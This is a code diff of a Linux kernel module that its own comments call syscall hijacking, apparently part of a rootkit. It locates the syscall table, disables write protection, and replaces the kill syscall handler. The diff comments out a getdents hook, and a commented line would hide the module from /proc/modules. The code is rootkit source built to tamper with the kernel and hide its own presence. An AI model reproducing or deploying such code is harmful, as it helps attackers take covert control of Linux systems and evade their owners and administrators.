@@ -13,9 +13,9 @@
 #include <linux/dirent.h>
 #include <linux/fs.h>
 #include <linux/sched.h>
-#include <linux/namei.h>
-#include <linux/path.h>
-#include <linux/fs_struct.h>
+//#include <linux/namei.h>
+//#include <linux/path.h>
+//#include <linux/fs_struct.h>
 
 MODULE_LICENSE("GPL");
 #ifdef __i386__
@@ -142,14 +142,13 @@ static int init(void) { //initial function, sets up syscall hijacking
     //list_del(&myself->list); //remove from places such as /proc/modules
 	syscall_table = (address *)find(); //give us the syscall table (defined above find())
     if (!syscall_table) {cleanup_module(); } //if find() fails, unload
-    //have to disable previous line otherwise you can't unload module without rebooting
     original_kill = (void *)syscall_table[__NR_kill]; //store old addresses
-    original_getdents = (void *)syscall_table[__NR_getdents];
+    //original_getdents = (void *)syscall_table[__NR_getdents];
     //original_getdents64 = (void *)syscall_table[__NR_getdents64];
     GPF_DISABLE; //messy, but 2.6 doesn't allow modification without this. see macro above
-    syscall_table[__NR_getdents] = (address)new_getdents;
+    //syscall_table[__NR_getdents] = (address)new_getdents;
     syscall_table[__NR_kill] = (address)new_kill;
-    //syscall_table[__NR_getdents64] = new_getdents64;
+    //syscall_table[__NR_getdents64] = (address)new_getdents64;
     GPF_ENABLE;
 	return 0;
 }
@@ -157,8 +156,8 @@ static int init(void) { //initial function, sets up syscall hijacking
 void cleanup_module(void) {
     GPF_DISABLE;
     syscall_table[__NR_kill] = (address)original_kill; //corrects the hijacking on unload
-    syscall_table[__NR_getdents] = (address)original_getdents;
-    //syscall_table[__NR_getdents64] = original_getdents64;
+    //syscall_table[__NR_getdents] = (address)original_getdents;
+    //syscall_table[__NR_getdents64] = (address)original_getdents64;
     GPF_ENABLE;
     return;
 }
